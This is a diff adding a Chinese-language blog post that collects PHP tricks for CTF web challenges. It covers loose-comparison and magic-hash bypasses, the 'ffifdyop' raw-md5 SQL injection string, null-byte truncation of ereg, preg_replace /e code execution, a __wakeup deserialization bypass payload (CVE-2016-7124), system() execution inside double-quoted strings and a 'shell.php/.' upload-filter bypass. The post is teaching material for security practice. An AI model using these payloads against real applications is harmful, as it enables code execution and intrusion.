@@ -1,0 +1,173 @@
+---
+layout:     post
+title:      "PHP 各种黑魔法"
+subtitle:   ""
+date:       2018-04-14 17:40:00
+author:     "kuron3k0"
+header-img: "img/home-bg-geek.jpg"
+tags:
+    - PHP
+    - CTF
+    - WEB
+---
+
+> 总结了一下关于在CTF中PHP的一些小技巧，今后会不断更新。
+> 虽然现在的题目很少会用到了，但知道多点总是没坏处的。
+
+## 弱类型
+```php
+<?php
+//数字与字符串的转换
+//输出 boolean true
+$a = 0;
+$b = '0asdf';
+var_dump($a == $b);
+
+//0和空值
+//输出 boolean true
+$a = 0;
+$b = NULL;
+var_dump($a == $b);
+?>
+
+```
+
+## 科学记数法
+```php
+<?php
+
+//输出 boolean true
+$a = '0e3543';
+$b = '0e1234';
+var_dump($a == $b);
+
+?>
+
+```
+
+## 函数
+- md5()
+```php
+<?php
+//http://xxxx?a[]=1&b[]=2
+//md5对数组类型hash的时候会返回false
+//输出 boolean true
+$a = md5($_GET['a']);
+$b = md5($_GET['b']);
+var_dump($a == $b);
+
+//把md5第二个参数设置为true，会将加密后字符串当成十六进制转换成字符
+//输出 'or'6�]��!r,��b
+echo md5('ffifdyop',true);
+
+?>
+```
+- ereg()/eregi()截断
+```php
+<?php
+
+//http://xxxx?a=abc;
+//输出 boolean false
+//http://xxxx?a=abc%00;
+//输出 boolean true
+var_dump(eregi('^[a-z]+$',$_GET[a]));
+
+?>
+```
+
+- preg_replace()代码执行
+```php
+<?php
+
+//pattern里使用参数e导致代码执行
+preg_replace('/test/e','phpinfo()','test');
+
+?>
+```
+
+- 对parse_url()参数检测的绕过
+
+
+![](/img/in-post/post-php-trick/parse_url1.png)
+*<center>两个斜杠</center>*
+
+![](/img/in-post/post-php-trick/parse_url2.png)
+*<center>三个斜杠</center>*
+
+<font color=red size=2 face="黑体">注：在path前面的"/"到达一定数量之后，parse_url会忽略参数</font>
+
+- mt_srand()伪随机数
+用`php_mt_seed`即可算出种子
+<br>
+
+
+- is_numeric十六进制绕过
+```php
+<?php
+
+var_dump(is_numeric('0xabcd'));
+//输出 boolean true
+
+?>
+```
+
+## 反序列化
+- _wakeup()魔术方法的绕过
+利用的是`CVE-2016-7124`
+```php
+<?php
+
+class test{
+
+    public $s = 'secret';
+
+    function __construct(){
+        
+    }
+
+    function __wakeup(){
+        echo 'wakeup'.'<br>';
+        $this->s = '';
+    }
+
+    function __destruct(){
+        echo 'destruct '.$this->s.'<br>';
+        
+    }
+}
+
+$a = new test();
+$serial = serialize($a).'<br>'; 
+//O:4:"test":1:{s:1:"s";s:6:"secret";}
+
+
+unserialize($serial);
+//输出：
+//wakeup
+//destruct 
+//可以看到反序列化先运行了__wakeup()函数
+
+//但是如果把反序列化中参数的个数调整到比原本类的个数高的话，即可绕过wakeup
+//即 O:4:"test":2:{s:1:"s";s:6:"secret";}
+unserialize('O:4:"test":2:{s:1:"s";s:6:"secret";}');
+//输出： 
+//destruct secret
+//没有运行wakeup
+
+
+?>
+
+```
+
+- 双引号里的代码执行
+```php
+<?php
+
+$a = "${system('whoami')}";
+
+?>
+```
+
+## 文件上传
+- shell.php/.
+上传的文件名带/.的话，php解析器自动忽略掉，从而绕过黑名单
